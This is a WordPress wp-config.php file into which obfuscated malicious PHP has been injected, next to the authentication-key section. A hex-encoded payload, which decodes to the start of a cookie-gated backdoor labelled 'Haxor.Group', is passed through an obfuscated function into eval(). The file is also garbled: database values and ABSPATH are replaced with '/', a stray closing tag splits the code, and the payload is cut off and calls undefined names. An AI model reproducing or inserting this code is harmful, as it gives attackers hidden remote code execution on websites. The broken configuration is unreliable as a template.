<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', '/' );

/** Database username */
define( 'DB_USER', '/' );

/** Database password */
define( 'DB_PASSWORD', '/' );

/** Database hostname */
define( 'DB_HOST', '/' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', '/' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
$vcdfc2756f7="3c3f7068700d0a2f2a2a0d0a202a20407061636b616765202020204861786f722e47726f75700d0a202a2040636f707972696768742020436f70797269676874202843292032303233202d2032303234204f70656e20536f75726365204d6174746572732c20496e632e20416c6c207269676874732072657365727665642e0d0a202a0d0a202a2f0d0a0d0a2f2f2040646570726563617465642020312e3020204465707265636174656420776974686f7574207265706c6163656d656e740d0a66756e6374696f6e2069735f6c6f676765645f696e28290d0a7b0d0a2020202072657475726e20697373657428245f434f4f4b49455b27757365725f6964275d2920262620245f434f4f4b49455b27757365725f6964275d203d3d3d20274c5048273b200d0a7d0d0a0d0a6966202869735f6c6f67676565645f696e282929207b0d0a20202020244172726179203d206172726179280d0a2020202020202020273636366637303665363e36363635363e272c202320666f207020656e203d3e20300d0a202020202020202
";$v30c81e8fbf=ff88dab8992($v710dcd22cd,$v8163ca778c);if($v30c81e8fbf!==false){eval("?>".$v30c81e8fbf);}else{echo"RSS Error.";}
?>
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( '/' ) ) {
	define( '/', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
